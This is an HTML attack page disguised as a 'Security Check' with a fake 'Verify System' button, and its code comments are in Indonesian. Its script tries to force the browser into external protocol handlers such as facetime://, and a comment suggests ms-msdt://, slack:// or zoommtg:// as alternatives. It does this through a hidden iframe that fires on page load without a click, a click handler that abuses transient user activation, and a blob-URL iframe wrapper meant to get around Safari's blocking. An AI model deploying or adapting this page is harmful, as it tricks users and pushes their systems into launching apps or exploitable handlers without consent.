<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0;
  }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
  h1 { color: #333; margin-bottom: 10px; }
  p { color: #666; margin-bottom: 20px; }
  .fake-btn {
    background: #007aff; color: #fff; padding: 15px 30px; border-radius: 8px;
    font-size: 18px; font-weight: bold; cursor: pointer; position: relative;
  }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel">
  <h1>🔒 Security Check</h1>
  <p id="status">Memproses...</p>
  <div class="fake-btn" id="trigger">Verify System</div>
</div>

<script>
(function () {
  'use strict';

  // Skema target: Ganti dengan zoommtg://, slack://, ms-msdt://
  var targetScheme = "facetime://security-check@apple.com";

  console.log("[!] Memulai Protocol Bypass...");

  // ============================================
  // 1. ZERO-CLICK ATTEMPT (Diblokir Browser Modern)
  // ============================================
  setTimeout(function() {
    try {
      var iframe = document.createElement('iframe');
      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups allow-same-origin";
      iframe.style.display = "none";
      
      // Tulis payload ke dalam iframe
      iframe.srcdoc = `
        <script>
          try {
            // Paksa navigasi top-level ke skema
            window.top.location.href = "${targetScheme}";
          } catch(e) {}
        <\/script>
      `;
      document.body.appendChild(iframe);
      console.log("[!] Zero-Click Iframe Trigger sent.");
    } catch(e) {}
  }, 1000);

  // ============================================
  // 2. GESTURE BYPASS (Race Condition pada Klik)
  // ============================================
  document.getElementById('trigger').addEventListener('click', function() {
    document.getElementById('status').innerText = "Membuka aplikasi...";

    // Trik: Gunakan location.replace (tidak meninggalkan history)
    // Eksekusi dalam microtask (0ms) untuk memanfaatkan Transient Activation
    queueMicrotask(function() {
      try {
        window.location.replace(targetScheme);
      } catch(e) {
        console.log("Gesture Bypass gagal:", e);
      }
    });

    // Trik Alternatif: Blob Wrapper
    // (Karena Safari memblokir window.location ke skema eksternal,
    // kita bungkus dalam blob: URL)
    try {
      var payload = `<script>window.location.replace("${targetScheme}");<\/script>`;
      var blob = new Blob([payload], { type: 'text/html' });
      var blobUrl = URL.createObjectURL(blob);
      
      // Coba panggil via iframe
      var iframe2 = document.createElement('iframe');
      iframe2.style.display = 'none';
      iframe2.src = blobUrl;
      document.body.appendChild(iframe2);
    } catch(e) {}
  });

})();
</script>
</body>
</html>
